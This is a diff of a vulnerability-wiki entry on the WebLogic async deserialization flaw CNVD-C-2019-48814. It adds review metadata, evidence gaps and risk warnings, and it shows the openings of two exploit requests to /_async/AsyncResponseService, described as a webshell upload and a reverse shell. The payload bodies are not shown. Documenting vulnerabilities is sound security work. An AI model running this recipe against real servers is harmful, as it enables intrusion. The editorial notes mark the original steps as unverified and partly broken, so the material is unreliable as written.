@@ -1,8 +1,55 @@
 ---
 source: "白阁文库 BaizeSec/bylibrary"
+title: "Weblogic反序列化漏洞CNVD-C-2019-48814"
+product: "Oracle WebLogic async XMLDecoder"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "active"
+primary_identifiers: "CNVD-C-2019-48814"
+referenced_identifiers: ""
+identifier_role: "primary"
+prerequisites: "Exposed unpatched async endpoint, writable known webapp path, Linux shell"
+source_status: "unknown"
+side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。; 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。"
+id: "vw-77fba7e0585f73a2a4cf8da4"
+entity_id: "ve-77fba7e0585f73a2a4cf8da4"
+schema_version: "1"
 ---
 
 # Weblogic反序列化漏洞CNVD-C-2019-48814
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：Exposed unpatched async endpoint, writable known webapp path, Linux shell
+- 证据范围：Async SOAP upload/reverse-shell recipe likely same family as 2725, but CNVD mapping needs authoritative confirmation before identifier merge. Raw base64 read but not decoded.
+
+### 本次正文校订
+
+- 按实际内容修正 2 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- Reachable AsyncResponseService alone does not prove vulnerability
+- WebLogic10.* overbroad and no patch-state matrix
+- docker run is concatenated with URL and credentials, making command invalid
+- Second request port49164 differs from earlier49163 and maps7002 rather than7001
+- Reverse-shell XML contains unescaped ampersands
+- Nested frontmatter, hardcoded deployment hash, no cleanup/fix/source provenance
+
+### 操作风险与资料使用
+
+- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
+- 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 ---
 title: 'Weblogic反序列化漏洞CNVD-C-2019-48814'
@@ -25,7 +72,7 @@ docker run -d -p 49163:7001 -p 49164:7002 -p 49165:5556 ismaleiva90/weblogic12:l
 
 写入shell
 
-```
+```http
 POST /_async/AsyncResponseService HTTP/1.1
 Host: 192.168.247.129:49163
 Content-Length: 1383
@@ -63,7 +110,7 @@ content-type: text/xml
 
 这里可以执行命令了，然后我们尝试反弹shell
 
-```
+```http
 POST /_async/AsyncResponseService HTTP/1.1
 Host: 192.168.247.129:49164
 Content-Length: 789
